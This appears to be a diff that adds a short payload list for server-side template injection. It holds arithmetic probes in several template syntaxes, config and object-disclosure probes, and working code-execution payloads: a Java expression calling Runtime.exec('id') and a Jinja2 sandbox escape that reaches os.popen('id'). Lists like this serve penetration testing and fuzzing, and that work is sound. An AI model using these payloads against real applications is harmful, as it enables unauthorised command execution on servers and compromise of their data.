@@ -1,0 +1,13 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{{7*'7'}}
+${{7*7}}
+{{config}}
+{{self}}
+{{''.__class__.__mro__}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
